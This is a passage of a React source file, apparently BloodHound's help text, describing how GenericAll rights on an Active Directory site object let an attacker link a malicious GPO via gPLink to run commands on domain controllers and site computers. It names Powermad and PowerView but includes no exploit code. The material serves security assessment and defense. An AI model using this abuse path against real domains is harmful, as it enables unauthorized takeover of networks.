                        an ADCS ESC13 attack.
                    </Typography>
                </>
            );
        case 'Site':
            return (
                <>
                    <Typography variant='body2'>
                        GenericAll permissions on a site object allow you to modify its gPLink attribute. A malicious
                        Group Policy Object (GPO) linked to the site can force affected computers and users to execute
                        arbitrary commands, for example through an immediate scheduled task.{' '}
                    </Typography>
                    <Typography variant='body2'>
                        For site objects, affected computers include the site's domain controllers, and also computers
                        whose IP addresses fall within one of the site's subnets. If the site is the default site,
                        affected computers also include computers that do not map to any other site. Affected users are
                        those who sign in to the affected computers.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a compromised domain-joined Windows machine, you can exploit this gPLink manipulation path
                        with Powermad, PowerView, and native Windows functionality. For site-specific requirements and
                        implementation details, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/site-unseen-enumerating-and-attacking-active-directory-sites'>
                            the Site Unseen article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target site object through its gPLink attribute.
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many computers and users the target site affects; each affected object will attempt
                        to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );
        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default WindowsAbuse;
